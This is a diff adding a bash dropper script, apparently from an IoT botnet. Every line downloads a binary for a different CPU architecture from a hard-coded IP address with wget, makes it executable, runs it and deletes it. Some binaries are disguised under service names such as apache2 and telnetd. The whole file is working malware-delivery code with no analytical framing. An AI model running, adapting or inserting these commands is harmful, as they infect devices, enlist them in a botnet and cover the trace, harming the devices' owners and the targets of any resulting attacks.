@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.mips; chmod +x DELTA.mips; ./DELTA.mips; rm -rf DELTA.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.mipsel; chmod +x DELTA.mipsel; ./DELTA.mipsel; rm -rf DELTA.mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.sh4; chmod +x DELTA.sh4; ./DELTA.sh4; rm -rf DELTA.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.x86; chmod +x DELTA.x86; ./DELTA.x86; rm -rf DELTA.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.armv6l; chmod +x DELTA.armv6l; ./DELTA.armv6l; rm -rf DELTA.armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.i686; chmod +x DELTA.i686; ./DELTA.i686; rm -rf DELTA.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.ppc; chmod +x DELTA.ppc; ./DELTA.ppc; rm -rf DELTA.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.i586; chmod +x DELTA.i586; ./DELTA.i586; rm -rf DELTA.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.m68k; chmod +x DELTA.m68k; ./DELTA.m68k; rm -rf DELTA.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.sh; chmod +x DELTA.sh; ./DELTA.sh; rm -rf DELTA.sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.apache2; chmod +x DELTA.apache2; ./DELTA.apache2; rm -rf DELTA.apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.147.169.56/DELTA.telnetd; chmod +x DELTA.telnetd; ./DELTA.telnetd; rm -rf DELTA.telnetd
